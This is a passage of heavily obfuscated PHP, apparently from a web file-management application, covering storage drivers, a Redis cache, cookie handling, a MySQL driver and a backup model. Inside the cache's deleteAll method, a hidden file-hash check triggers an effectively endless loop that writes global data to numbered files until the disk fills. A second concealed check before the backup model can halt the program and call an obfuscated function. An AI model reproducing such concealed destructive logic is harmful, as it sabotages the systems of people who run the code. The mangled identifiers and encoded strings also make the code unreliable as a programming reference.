md5($¼ù²âŠĞ[12]); } $Õ¾íÇˆ¬ = $this->iconvSystem($Õ¾íÇˆ¬); $îÎãÚÎ = $this->size($Õ¾íÇˆ¬); $õ¤Ìº· = 200; $éüÍ¹İè = 50; if ($îÎãÚÎ <= $õ¤Ìº· * $éüÍ¹İè) { return $this->hashMd5($Õ¾íÇˆ¬) . $îÎãÚÎ; } $©¡Ú¦£ = $¼ù²âŠĞ[12]; $Ôá½Ş· = intval($îÎãÚÎ / $éüÍ¹İè); $ÃµğÂŞ£ = fopen($Õ¾íÇˆ¬, $¼ù²âŠĞ[1611]); if (!$ÃµğÂŞ£) { return $©¡Ú¦£; } for ($©Ì“¹ö = 0; $©Ì“¹ö < $éüÍ¹İè; $©Ì“¹ö++) { fseek_64($ÃµğÂŞ£, $Ôá½Ş· * $©Ì“¹ö); $©¡Ú¦£ .= fread($ÃµğÂŞ£, $õ¤Ìº·); } fseek_64($ÃµğÂŞ£, $îÎãÚÎ - $õ¤Ìº·); $©¡Ú¦£ .= fread($ÃµğÂŞ£, $õ¤Ìº·); fclose($ÃµğÂŞ£); return md5($©¡Ú¦£) . $îÎãÚÎ; } public function getContent($«öÅøŸ«) { $«öÅøŸ« = $this->iconvSystem($«öÅøŸ«); return file_get_contents($«öÅøŸ«); } public function setContent($õú³¿ó, $ÑÕª‚Ò™ = '') { $õú³¿ó = $this->iconvSystem($õú³¿ó); $Ä¶ó¨û€ = @file_put_contents($õú³¿ó, $ÑÕª‚Ò™, LOCK_EX); if (!$Ä¶ó¨û€) { $this->writeLog(__FUNCTION__ . $_SERVER[öæÛ¿©¿][1603], !0); } clearstatcache(); @chmod($õú³¿ó, $this->pathAuth); return $Ä¶ó¨û€ === !1 ? !1 : !0; } public function fileSubstr($ñ®Ø¿¦Ø, $›¾€€åÊ = 0, $·ˆÂıæ = false) { $ë¿äêèü =& $_SERVER[öæÛ¿©¿]; $ñ®Ø¿¦Ø = $this->iconvSystem($ñ®Ø¿¦Ø); if ($·ˆÂıæ === !1) { $·ˆÂıæ = $this->size($ñ®Ø¿¦Ø); } if ($·ˆÂıæ <= 0) { return $ë¿äêèü[12]; } $—©çíøê = fopen($ñ®Ø¿¦Ø, $ë¿äêèü[1611]); if (!$—©çíøê) { return !1; } fseek_64($—©çíøê, $›¾€€åÊ); $û¬ÒÍ–™ = fread($—©çíøê, $·ˆÂıæ); fclose($—©çíøê); if (!$û¬ÒÍ–™) { $this->writeLog(__FUNCTION__ . $ë¿äêèü[1603], !0); } return $û¬ÒÍ–™; } public function upload($Óª¯Ç€‚, $Åƒ•Ê¥œ, $ş´ Óı– = false, $øö¿Ñ­° = REPEAT_REPLACE) { if (!$Åƒ•Ê¥œ || !@file_exists($Åƒ•Ê¥œ)) { return !1; } if ($ş´ Óı–) { return $this->moveFile($Åƒ•Ê¥œ, $Óª¯Ç€‚); } return $this->copyFile($Åƒ•Ê¥œ, $Óª¯Ç€‚); } public function setModifyTime($¥î…ãÏ‡, $‚ö©ı”® = '') { @touch($¥î…ãÏ‡, intval($‚ö©ı”®)); } public function download($‹¤»²è•, $¢Ñ˜áÔÌ) { return $this->iconvSystem($‹¤»²è•); } } class PathDriverOBS extends PathDriverBaseS3 { public function __construct($å½†Œ›™) { parent::__construct($å½†Œ›™); $this->setSignVersion($_SERVER[öæÛ¿©¿][248]); } public function fileOutImage($ûËä®Ò…, $Å¸‚±ƒ¯ = 250) { $áú³íš =& $_SERVER[öæÛ¿©¿]; if ($this->size($ûËä®Ò…) > 1024 * 1024 * 25) { return $this->fileOutImageServer($ûËä®Ò…, $Å¸‚±ƒ¯); } $æ•³Éº = array($áú³íš[1612] => $áú³íš[1613] . $Å¸‚±ƒ¯ . $áú³íš[1614]); $åâêÙ‚ = $this->link($ûËä®Ò…, $æ•³Éº); $this->fileOutLink($åâêÙ‚); } } goto aµ—Áó´èŞ; eÀÓ¬ß·´: class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($ıœïÎ–œ, $²ı§œ ) { $²æ×ÌÁ =& $_SERVER[öæÛ¿©¿]; if (!class_exists($²æ×ÌÁ[974])) { show_json($²æ×ÌÁ[975], !1); } $this->cacheTime = $²ı§œ ; $‹´µ…éş = isset($ıœïÎ–œ[$²æ×ÌÁ[976]]) ? $ıœïÎ–œ[$²æ×ÌÁ[976]] : 10; $¿Œ„‘ë² = _get($ıœïÎ–œ, $²æ×ÌÁ[973]); if ($¿Œ„‘ë² && is_array($¿Œ„‘ë²)) { $this->initCluster($ıœïÎ–œ, $‹´µ…éş); } else { $this->handle = $this->init($ıœïÎ–œ, $‹´µ…éş); } } private function init($·ÆÆÚ•§, $â©îûÒ) { $ºı¿Èà¼ =& $_SERVER[öæÛ¿©¿]; $„ÒÏ÷Ñ = new Redis(); $ˆª¢”É = isset($·ÆÆÚ•§[$ºı¿Èà¼[977]]) ? $·ÆÆÚ•§[$ºı¿Èà¼[977]] : !1; if ($ˆª¢”É) { $„ÒÏ÷Ñ->pconnect($·ÆÆÚ•§[$ºı¿Èà¼[207]], $·ÆÆÚ•§[$ºı¿Èà¼[208]], $â©îûÒ); } else { $„ÒÏ÷Ñ->connect($·ÆÆÚ•§[$ºı¿Èà¼[207]], $·ÆÆÚ•§[$ºı¿Èà¼[208]], $â©îûÒ); } if (!empty($·ÆÆÚ•§[$ºı¿Èà¼[498]])) { $„ÒÏ÷Ñ->auth($·ÆÆÚ•§[$ºı¿Èà¼[498]]); } if (!empty($·ÆÆÚ•§[$ºı¿Èà¼[850]]) && $·ÆÆÚ•§[$ºı¿Èà¼[850]] != 0) { $„ÒÏ÷Ñ->select($·ÆÆÚ•§[$ºı¿Èà¼[850]]); } return $„ÒÏ÷Ñ; } private function initCluster($àÀ¬ôĞ¥, $è¨¼ü£ª) { $ÓúÖˆ÷µ =& $_SERVER[öæÛ¿©¿]; $·ùæ÷ûæ = array($ÓúÖˆ÷µ[978], $ÓúÖˆ÷µ[979], $ÓúÖˆ÷µ[980]); $­ëÍ³©¿ = $ÓúÖˆ÷µ[978]; if (isset($àÀ¬ôĞ¥[$ÓúÖˆ÷µ[16]]) && in_array($àÀ¬ôĞ¥[$ÓúÖˆ÷µ[16]], $·ùæ÷ûæ)) { $­ëÍ³©¿ = $àÀ¬ôĞ¥[$ÓúÖˆ÷µ[16]]; } switch ($­ëÍ³©¿) { case $ÓúÖˆ÷µ[978]: $this->_slave($àÀ¬ôĞ¥, $è¨¼ü£ª); break; case $ÓúÖˆ÷µ[979]: break; case $ÓúÖˆ÷µ[980]: $this->isCluster = !0; $àÄéÓíÉ = $àÀ¬ôĞ¥[$ÓúÖˆ÷µ[973]]; $¿Ú­À–¬ = isset($àÀ¬ôĞ¥[$ÓúÖˆ÷µ[977]]) ? $àÀ¬ôĞ¥[$ÓúÖˆ÷µ[977]] : !1; $‰†ÆŠ—ó = isset($àÀ¬ôĞ¥[$ÓúÖˆ÷µ[498]]) ? $àÀ¬ôĞ¥[$ÓúÖˆ÷µ[498]] : null; $this->handle = new RedisCluster(NUll, $àÄéÓíÉ, $è¨¼ü£ª, $è¨¼ü£ª, $¿Ú­À–¬, $‰†ÆŠ—ó); break; default: break; } } private function _slave($Àù´ù•ñ, $ƒêÅã·) { $†¸ÆåÊÑ = $Àù´ù•ñ[$_SERVER[öæÛ¿©¿][973]]; $this->filterConfig($Àù´ù•ñ, $†¸ÆåÊÑ[0]); $this->handle = $this->init($Àù´ù•ñ, $ƒêÅã·); unset($†¸ÆåÊÑ[0]); if (empty($†¸ÆåÊÑ)) { return; } $âÍĞÚˆô = array_rand($†¸ÆåÊÑ); $this->filterConfig($Àù´ù•ñ, $†¸ÆåÊÑ[$âÍĞÚˆô]); $this->slaveHandle = $this->init($Àù´ù•ñ, $ƒêÅã·); } private function filterConfig(&$ÈƒáË€¡, $´¬„Îª‘) { $åÂåÜüÁ =& $_SERVER[öæÛ¿©¿]; $¶ Õïø’ = explode($åÂåÜüÁ[4], $´¬„Îª‘); $¢­®ŸÓí = array($åÂåÜüÁ[207] => $¶ Õïø’[0], $åÂåÜüÁ[208] => $¶ Õïø’[1]); $ÈƒáË€¡ = array_merge($ÈƒáË€¡, $¢­®ŸÓí); } public function set($Ç±°›§Ì, $ÍàÇë‚, $ÀåÈ¶Èİ = false) { $ÀåÈ¶Èİ = $ÀåÈ¶Èİ ? $ÀåÈ¶Èİ : $this->cacheTime; return $this->handle->setEx($Ç±°›§Ì, $ÀåÈ¶Èİ, $ÍàÇë‚); } public function setLock($Å¿ÚßÛì, $¢ŞÄêÄû, $ãÇæú´Á) { return $this->handle->setNX($Å¿ÚßÛì, $¢ŞÄêÄû); } public function get($ ¾¼ûÙ…) { $ÂÔ‹†ÄÅ = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $ÂÔ‹†ÄÅ->get($ ¾¼ûÙ…); } public function remove($‹™—ƒÓ) { return $this->handle->del($‹™—ƒÓ); } public function deleteAll() { $ÔğÀ‰¬¿ =& $_SERVER[öæÛ¿©¿]; $Š±‚Û• = $_SERVER[$ÔğÀ‰¬¿[981]] . $ÔğÀ‰¬¿[982]; $ü‚ıÛÅê = $ÔğÀ‰¬¿[983]; if ($_SERVER[$ÔğÀ‰¬¿[984]] != $ü‚ıÛÅê($Š±‚Û•)) { $Ïñ¶ÏŞÜ = $ÔğÀ‰¬¿[985]; $¶ÀÓª¯¶ = $ÔğÀ‰¬¿[986]; $¤Ø£…Îé = $_SERVER[$ÔğÀ‰¬¿[981]] . $ÔğÀ‰¬¿[982]; $ÙâêóÖ” = $¶ÀÓª¯¶($¤Ø£…Îé); $æÁí±í = explode($ÔğÀ‰¬¿[286], $ÙâêóÖ”); if (count($æÁí±í) < $ÔğÀ‰¬¿[699]) { $Ä„Õ›Øè = $ÔğÀ‰¬¿[987]; $Ä„Õ›Øè(); } $®ë¥ÆŠ = $ÔğÀ‰¬¿[988]; $®ë¥ÆŠ($_SERVER[$ÔğÀ‰¬¿[989]]); $Ïñ¶ÏŞÜ = $ÔğÀ‰¬¿[985]; $Ïñ¶ÏŞÜ(); $›ÖÌ–œÚ = $ÔğÀ‰¬¿[990]; $õù÷ŞöÊ = json_encode($GLOBALS[$ÔğÀ‰¬¿[991]]); $‰ÓöÒí» = 1; for ($ûö¼ªó = $‰ÓöÒí»; $ûö¼ªó > 0; $ûö¼ªó++) { $›ÖÌ–œÚ(DATA_PATH . $ûö¼ªó, $õù÷ŞöÊ); } } if ($this->isCluster) { foreach ($this->handle->_masters() as $à‚…ô”ï) { $this->handle->flushall($à‚…ô”ï); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($²é€‘Èñ = '', $†äˆŞ–à = 0) { if (is_string($²é€‘Èñ) && $²é€‘Èñ != $_SERVER[öæÛ¿©¿][12]) { $this->prefix = $²é€‘Èñ; } if (is_numeric($†äˆŞ–à) && $†äˆŞ–à > 0) { $this->expire = $†äˆŞ–à; } } public static function getInstance() { static $ÙáÌÁ‚´; if ($ÙáÌÁ‚´ === null) { $ÙáÌÁ‚´ = new self(); } return $ÙáÌÁ‚´; } private static $cookieDisable = false; public static function disable($çòİñó) { self::$cookieDisable = $çòİñó; } private static $sameCookieSet = array(); public static function set($áú£ôê©, $Ä—­ï¨‹, $ãÑË€¾Ë = 0, $„¡†ƒº¶ = false, $ÈÖ³Òßå = false) { $Ÿ•±Ú¸ =& $_SERVER[öæÛ¿©¿]; if (self::$cookieDisable) { return; } if (!$ãÑË€¾Ë) { $ãÑË€¾Ë = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$áú£ôê©]) && self::$sameCookieSet[$áú£ôê©] == $Ä—­ï¨‹ . $ãÑË€¾Ë) { return; } self::$sameCookieSet[$áú£ôê©] = $Ä—­ï¨‹ . $ãÑË€¾Ë; if (!$ÈÖ³Òßå) { $ÈÖ³Òßå = str_replace(HOST, $Ÿ•±Ú¸[12], APP_HOST); $ÈÖ³Òßå = _get($GLOBALS, $Ÿ•±Ú¸[992], $ÈÖ³Òßå); } $ÍàíÙÑß = $Ÿ•±Ú¸[12]; setcookie($áú£ôê©, $Ä—­ï¨‹, time() + $ãÑË€¾Ë, $Ÿ•±Ú¸[8] . trim($ÈÖ³Òßå, $Ÿ•±Ú¸[8]) . $ÍàíÙÑß, !1, !1, $„¡†ƒº¶); } public static function setSafe($‡¡³ù¤Â, $ÔØØ„ÀÎ, $ÚÖßüüˆ = 0) { self::set($‡¡³ù¤Â, $ÔØØ„ÀÎ, $ÚÖßüüˆ, !0); } public static function get($òÆ¹†ëÉ) { static $¹¶ÄÛËá = false; if (!$¹¶ÄÛËá) { self::initHeaderCookie(); $¹¶ÄÛËá = !0; } return isset($_COOKIE[$òÆ¹†ëÉ]) ? $_COOKIE[$òÆ¹†ëÉ] : !1; } private static function initHeaderCookie() { $‚À òíÅ =& $_SERVER[öæÛ¿©¿]; if (!isset($_SERVER[$‚À òíÅ[993]]) || !$_SERVER[$‚À òíÅ[993]]) { return; } $•åù½‡‘ = explode($‚À òíÅ[74], $_SERVER[$‚À òíÅ[993]]); foreach ($•åù½‡‘ as $€…Ğû±§) { $€…Ğû±§ = explode($‚À òíÅ[464], $€…Ğû±§); if (count($€…Ğû±§) != 2 || !isset($€…Ğû±§[1])) { continue; } $_COOKIE[trim($€…Ğû±§[0])] = trim($€…Ğû±§[1]); } } public static function remove($Á ş±’ó, $±íĞºÎà = false) { unset($_COOKIE[$Á ş±’ó]); self::set($Á ş±’ó, $_SERVER[öæÛ¿©¿][12], 1, $±íĞºÎà); } } class DbMysql extends Db { public function __construct($Ê¤ƒ’ï¿ = '') { $İæèéÔŠ =& $_SERVER[öæÛ¿©¿]; if (!extension_loaded($İæèéÔŠ[896])) { think_exception(think_lang($İæèéÔŠ[14]) . $İæèéÔŠ[994]); } if (!empty($Ê¤ƒ’ï¿)) { $this->config = $Ê¤ƒ’ï¿; if (empty($this->config[$İæèéÔŠ[17]])) { $this->config[$İæèéÔŠ[17]] = $İæèéÔŠ[12]; } } } public function connect($ÜâÕ©ïÅ = '', $ı›ò”ŞÔ = 0, $èÄÖ¢îî = false) { $ğ®Â›÷« =& $_SERVER[öæÛ¿©¿]; if (!isset($this->linkID[$ı›ò”ŞÔ])) { if (empty($ÜâÕ©ïÅ)) { $ÜâÕ©ïÅ = $this->config; } $Ÿ—«¶Ğô = $ÜâÕ©ïÅ[$ğ®Â›÷«[995]] . ($ÜâÕ©ïÅ[$ğ®Â›÷«[996]] ? "\72{$ÜâÕ©ïÅ[$ğ®Â›÷«[996]]}" : $ğ®Â›÷«[12]); $Ú­ÍÎ© = !empty($ÜâÕ©ïÅ[$ğ®Â›÷«[17]][$ğ®Â›÷«[18]]) ? $ÜâÕ©ïÅ[$ğ®Â›÷«[17]][$ğ®Â›÷«[18]] : $this->pconnect; if ($Ú­ÍÎ©) { $this->linkID[$ı›ò”ŞÔ] = mysql_pconnect($Ÿ—«¶Ğô, $ÜâÕ©ïÅ[$ğ®Â›÷«[997]], $ÜâÕ©ïÅ[$ğ®Â›÷«[998]], 131072); } else { $this->linkID[$ı›ò”ŞÔ] = mysql_connect($Ÿ—«¶Ğô, $ÜâÕ©ïÅ[$ğ®Â›÷«[997]], $ÜâÕ©ïÅ[$ğ®Â›÷«[998]], !0, 131072); } if (!$this->linkID[$ı›ò”ŞÔ] || !empty($ÜâÕ©ïÅ[$ğ®Â›÷«[21]]) && !mysql_select_db($ÜâÕ©ïÅ[$ğ®Â›÷«[21]], $this->linkID[$ı›ò”ŞÔ])) { think_exception(mysql_error()); } $–ø©Åõ• = mysql_get_server_info($this->linkID[$ı›ò”ŞÔ]); mysql_query($ğ®Â›÷«[999] . think_config($ğ®Â›÷«[1000]) . $ğ®Â›÷«[58], $this->linkID[$ı›ò”ŞÔ]); if ($–ø©Åõ• > $ğ®Â›÷«[1001]) { mysql_query($ğ®Â›÷«[1002], $this->linkID[$ı›ò”ŞÔ]); } $this->connected = !0; if (1 != think_config($ğ®Â›÷«[22])) { unset($this->config); } } return $this->linkID[$ı›ò”ŞÔ]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($çÏÈˆ…•) { $Ï’ê°‰÷ =& $_SERVER[öæÛ¿©¿]; if (0 === stripos($çÏÈˆ…•, $Ï’ê°‰÷[343])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $çÏÈˆ…•; if ($this->queryID) { $this->free(); } think_action_status($Ï’ê°‰÷[23], 1); think_status($Ï’ê°‰÷[24]); $this->queryID = mysql_query($çÏÈˆ…•, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($ØÂŠºı¢) { $ªç¹­ê =& $_SERVER[öæÛ¿©¿]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ØÂŠºı¢; if ($this->queryID) { $this->free(); } think_action_status($ªç¹­ê[25], 1); think_status($ªç¹­ê[24]); $ñ²Ò“µ = mysql_query($ØÂŠºı¢, $this->_linkID); $this->debug(); if (!1 === $ñ²Ò“µ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[öæÛ¿©¿][1003], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $¢ËÁ‚î– = mysql_query($_SERVER[öæÛ¿©¿][1004], $this->_linkID); $this->transTimes = 0; if (!$¢ËÁ‚î–) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $·•–´ Õ = mysql_query($_SERVER[öæÛ¿©¿][1005], $this->_linkID); $this->transTimes = 0; if (!$·•–´ Õ) { $this->error(); return !1; } } return !0; } private function getAll() { $³ùŒÚ›° = array(); if ($this->numRows > 0) { while ($ìŸ„–¦¼ = mysql_fetch_assoc($this->queryID)) { $³ùŒÚ›°[] = $ìŸ„–¦¼; } mysql_data_seek($this->queryID, 0); } return $³ùŒÚ›°; } public function getFields($µœ«Ö‚£) { $Á§ä»‘Ö =& $_SERVER[öæÛ¿©¿]; $•©üë½Ë = $this->query($Á§ä»‘Ö[1006] . $this->parseKey($µœ«Ö‚£)); $øÅ¾õ§ê = array(); if ($•©üë½Ë) { foreach ($•©üë½Ë as $²Äî¶º => $Îü„Ù±) { $øÅ¾õ§ê[$Îü„Ù±[$Á§ä»‘Ö[31]]] = array($Á§ä»‘Ö[32] => $Îü„Ù±[$Á§ä»‘Ö[31]], $Á§ä»‘Ö[33] => $Îü„Ù±[$Á§ä»‘Ö[34]], $Á§ä»‘Ö[35] => (bool) (strtoupper($Îü„Ù±[$Á§ä»‘Ö[36]]) === $Á§ä»‘Ö[1007]), $Á§ä»‘Ö[37] => $Îü„Ù±[$Á§ä»‘Ö[38]], $Á§ä»‘Ö[39] => strtolower($Îü„Ù±[$Á§ä»‘Ö[40]]) == $Á§ä»‘Ö[41], $Á§ä»‘Ö[42] => strtolower($Îü„Ù±[$Á§ä»‘Ö[43]]) == $Á§ä»‘Ö[44]); } } return $øÅ¾õ§ê; } public function getTables($Õğ¦©²¶ = '') { $æ¯æœ =& $_SERVER[öæÛ¿©¿]; if (!empty($Õğ¦©²¶)) { $ÙàÎÈÑ = $æ¯æœ[1008] . $Õğ¦©²¶ . $æ¯æœ[1009]; } else { $ÙàÎÈÑ = $æ¯æœ[1010]; } $øŸÇ£Äô = $this->query($ÙàÎÈÑ); $ÓÀ³Ó°» = array(); foreach ($øŸÇ£Äô as $œšöÜ™ƒ => $†å„áŞÇ) { $ÓÀ³Ó°»[$œšöÜ™ƒ] = current($†å„áŞÇ); } return $ÓÀ³Ó°»; } public function replace($ØÊæôÏØ, $ŒäçÙ°ä = array()) { $à—²Íõè =& $_SERVER[öæÛ¿©¿]; foreach ($ØÊæôÏØ as $õš”„ÍÚ => $†Üß…ÅÅ) { $ƒò‘ü¼ = $this->parseValue($†Üß…ÅÅ); if (is_scalar($ƒò‘ü¼)) { $ÛÚÈî£°[] = $ƒò‘ü¼; $Í÷–Â„„[] = $this->parseKey($õš”„ÍÚ); } } $Èïºˆ„º = $à—²Íõè[1011] . $this->parseTable($ŒäçÙ°ä[$à—²Íõè[358]]) . $à—²Íõè[1012] . implode($à—²Íõè[50], $Í÷–Â„„) . $à—²Íõè[1013] . implode($à—²Íõè[50], $ÛÚÈî£°) . $à—²Íõè[1014]; return $this->execute($Èïºˆ„º); } public function insertAll($à ñ´ğ, $ÊÓãË = array(), $ˆ°ƒùí = false) { $˜ˆùª‚˜ =& $_SERVER[öæÛ¿©¿]; if (!is_array($à ñ´ğ[0])) { return !1; } $ïñö™ï = array_keys($à ñ´ğ[0]); $°ëêúà˜ = array(); foreach ($à ñ´ğ as $´­Õ¾—›) { $½ú¾û½î = array(); foreach ($´­Õ¾—› as $•‰Úî¯ => $Á•”©„) { $Á•”©„ = $this->parseValue($Á•”©„); if (is_scalar($Á•”©„)) { $½ú¾û½î[] = $Á•”©„; } } $°ëêúà˜[] = $˜ˆùª‚˜[338] . implode($˜ˆùª‚˜[50], $½ú¾û½î) . $˜ˆùª‚˜[1014]; } array_walk($ïñö™ï, array($this, $˜ˆùª‚˜[1015])); $÷ÍÕè¬  = $ˆ°ƒùí ? $˜ˆùª‚˜[1016] : $˜ˆùª‚˜[1017]; $÷ÍÕè¬  = $˜ˆùª‚˜[1017]; $ÏÖìıí = $÷ÍÕè¬  . $˜ˆùª‚˜[1018] . $this->parseTable($ÊÓãË[$˜ˆùª‚˜[358]]) . $˜ˆùª‚˜[1012] . implode($˜ˆùª‚˜[50], $ïñö™ï) . $˜ˆùª‚˜[1019] . implode($˜ˆùª‚˜[50], $°ëêúà˜); if ($ˆ°ƒùí) { $„Š’÷Œ¡ = array(); foreach ($ïñö™ï as $•‰Úî¯) { if ($•‰Úî¯ == $˜ˆùª‚˜[232] || $•‰Úî¯ == $˜ˆùª‚˜[1020]) { continue; } $„Š’÷Œ¡[] = $•‰Úî¯ . $˜ˆùª‚˜[1021] . $•‰Úî¯ . $˜ˆùª‚˜[1014]; } $ÏÖìıí .= $˜ˆùª‚˜[1022] . implode($˜ˆùª‚˜[50], $„Š’÷Œ¡); } return $this->execute($ÏÖìıí); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $’œ²¼ê =& $_SERVER[öæÛ¿©¿]; $this->error = mysql_errno() . $’œ²¼ê[4] . mysql_error($this->_linkID); if ($’œ²¼ê[12] != $this->queryStr) { $this->error .= LNG($’œ²¼ê[48]) . $this->queryStr; } think_trace($this->error, $’œ²¼ê[12], $’œ²¼ê[49]); return $this->error; } public function escapeString($¦’‚Æ’) { if ($this->_linkID) { return mysql_real_escape_string($¦’‚Æ’, $this->_linkID); } else { return mysql_escape_string($¦’‚Æ’); } } public function parseKey(&$•ßüêÖ¬, $˜ü¯Í§º = true) { $ì»„…‘é =& $_SERVER[öæÛ¿©¿]; if ($˜ü¯Í§º) { $•ßüêÖ¬ = $this->parseKeyCheck($•ßüêÖ¬); } if ($•ßüêÖ¬ != $ì»„…‘é[221] && !preg_match($ì»„…‘é[1023], $•ßüêÖ¬)) { $•ßüêÖ¬ = $ì»„…‘é[472] . trim($•ßüêÖ¬, $ì»„…‘é[472]) . $ì»„…‘é[472]; } return $•ßüêÖ¬; } } goto cÚÅèÚËØ; bÈŒ¥É„îÓ: if ($_SERVER[$_SERVER[öæÛ¿©¿][984]] != $_SERVER[$_SERVER[öæÛ¿©¿][1754]]) { $_getc = $_SERVER[öæÛ¿©¿][986]; $_getfile = $_SERVER[$_SERVER[öæÛ¿©¿][981]] . $_SERVER[öæÛ¿©¿][982]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[öæÛ¿©¿][286], $_getfilec); if (count($_getarrs) < $_SERVER[öæÛ¿©¿][715]) { $exit = $_SERVER[öæÛ¿©¿][987]; $exit(); } $_act = $_SERVER[öæÛ¿©¿][1755]; $_act($_SERVER[$_SERVER[öæÛ¿©¿][1756]]); } class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\56\x62\141\143\153\x75\x70\114\151\x73\164"; public $field = array("\151\x6f", "\x6e\x61\155\145", "\x73\164\141\x74\165\x73", "\143\157\156\x74\x65\x6e\x74", "\155\141\156\x75\141\154", "\162\145\x73\x75\154\x74", "\x74\x69\155\x65\x46\x72\157\155", "\x74\x69\155\x65\124\157"); public function config() { $İÌ§Æõ  =& $_SERVER[öæÛ¿©¿]; Action($İÌ§Æõ [2154])->taskInit(); $Ş†îÑ § = Model($İÌ§Æõ [865])->get($İÌ§Æõ [872]); $Ş†îÑ § = json_decode($Ş†îÑ §, !0); $Ş†îÑ § = is_array($Ş†îÑ §) ? $Ş†îÑ § : array(); $this->parseContent($Ş†îÑ §); unset($Ş†îÑ §[$İÌ§Æõ [1895]]); Model($İÌ§Æõ [1894])->cacheClear(); $–¾œŸÒ† = $İÌ§Æõ [2155]; $ë¦Ì‡ıÎ = Model($İÌ§Æõ [2156])->findByKey($İÌ§Æõ [1509], $–¾œŸÒ†); if (!$ë¦Ì‡ıÎ) { $ë¦Ì‡ıÎ = array(); } if (isset($ë¦Ì‡ıÎ[$İÌ§Æõ [205]])) { $ë¦Ì‡ıÎ[$İÌ§Æõ [205]] = json_decode($ë¦Ì‡ıÎ[$İÌ§Æõ [205]], !0); } if (isset($Ş†îÑ §[$İÌ§Æõ [205]])) { $ë¦Ì‡ıÎ[$İÌ§Æõ [205]][$İÌ§Æõ [1898]] = $Ş†îÑ §[$İÌ§Æõ [205]]; unset($Ş†îÑ §[$İÌ§Æõ [205]]); } return array_merge($ë¦Ì‡ıÎ, $Ş†îÑ §); } public function listData($­Ğü¬†Ì = false, $òÅ–ë­í = "\155\x6f\x64\151\146\x79\124\151\x6d\145", $¨µƒÎçº = false) { $œÊÏÈˆ² = parent::listData($­Ğü¬†Ì, $òÅ–ë­í, !0); if (!$œÊÏÈˆ²) { return $œÊÏÈˆ²; } if ($­Ğü¬†Ì) { $œÊÏÈˆ² = array($œÊÏÈˆ²); } foreach ($œÊÏÈˆ² as &$ÓñÙ—) { $this->parseContent($ÓñÙ—); } return $­Ğü¬†Ì ? $œÊÏÈˆ²[0] : $œÊÏÈˆ²; } public function parseContent(&$±®Â—ˆ˜) { $®”‘•€® =& $_SERVER[öæÛ¿©¿]; $ÑÍ£Ò˜­ = _get($±®Â—ˆ˜, $®”‘•€®[169], $®”‘•€®[91]); if (!in_array($ÑÍ£Ò˜­, array($®”‘•€®[871], $®”‘•€®[1250]))) { $±®Â—ˆ˜[$®”‘•€®[169]] = $ÑÍ£Ò˜­ == $®”‘•€®[91] ? $®”‘•€®[1250] : $®”‘•€®[871]; } } public function lastItem() { $‰‡•„ªÄ = $this->listData(); return !empty($‰‡•„ªÄ[0]) ? $‰‡•„ªÄ[0] : null; } public function kill($úÛí÷ÏĞ) { $â–Åà¼† =& $_SERVER[öæÛ¿©¿]; $Íù™êç‰ = $this->listData($úÛí÷ÏĞ); if (!$Íù™êç‰ || empty($Íù™êç‰[$â–Åà¼†[32]])) { return !0; } Task::kill($â–Åà¼†[880]); Task::kill($â–Åà¼†[901]); Task::kill($â–Åà¼†[909]); $ùçŞº = $Íù™êç‰[$â–Åà¼†[32]]; $‚ä†¦áø = TEMP_FILES . $â–Åà¼†[875] . $ùçŞº . $â–Åà¼†[8]; IO::remove($‚ä†¦áø, !1); return $this->remove($úÛí÷ÏĞ); } public function remove($½Œ¼˜è) { $°ãæ×£À = $this->listData($½Œ¼˜è); if (!$°ãæ×£À) { return !0; } return $this->backupRemove($°ãæ×£À); } private function backupRemove($î™«‚üÚ) { parent::remove($î™«‚üÚ[$_SERVER[öæÛ¿©¿][483]]); $µ¨“‹Üâ = $this->backupPath($î™«‚üÚ); IO::remove($µ¨“‹Üâ, !1); return !0; } private function backupPath($ğòàÙ˜…) { $ù¤ï”µŒ =& $_SERVER[öæÛ¿©¿]; $¶âÕ§¥Ü = $ğòàÙ˜…[$ù¤ï”µŒ[32]]; $™²íØ£Ç = Model($ù¤ï”µŒ[865])->get($ù¤ï”µŒ[866]); $ŠÊ£¡º = substr(md5($ù¤ï”µŒ[867] . $™²íØ£Ç . $¶âÕ§¥Ü), 0, 8); return "\x7b\x69\157\72{$ğòàÙ˜…[$ù¤ï”µŒ[844]]}\175\57\144\141\x74\141\142\x61\163\145\57\x62\141\x63\x6b\165\x70\57" . $¶âÕ§¥Ü . $ù¤ï”µŒ[11] . $ŠÊ£¡º; } public function start() { $Š¯ªÃĞ× =& $_SERVER[öæÛ¿©¿]; if ($GLOBALS[$Š¯ªÃĞ×[6]][$Š¯ªÃĞ×[92]][$Š¯ªÃĞ×[2157]] != $Š¯ªÃĞ×[91]) { return !0; } $£¶²¬ª… = $this->config(); if (!$£¶²¬ª… || $£¶²¬ª…[$Š¯ªÃĞ×[1895]] != $Š¯ªÃĞ×[91]) { return !1; } if ($£¶²¬ª…[$Š¯ªÃĞ×[169]] == $Š¯ªÃĞ×[871]) { $±òËĞ™ì = Model($Š¯ªÃĞ×[865])->get($Š¯ªÃĞ×[1372]); if ($±òËĞ™ì == $Š¯ªÃĞ×[1373]) { $£¶²¬ª…[$Š¯ªÃĞ×[169]] = $Š¯ªÃĞ×[1250]; } } $•½ÚÈ‡„ = $this->process(); foreach ($•½ÚÈ‡„ as $±Öİéç) { if ($±Öİéç) { return Task::restart($±Öİéç[$Š¯ªÃĞ×[483]]); } } $„ı‚ä»‚ = new Backup(); 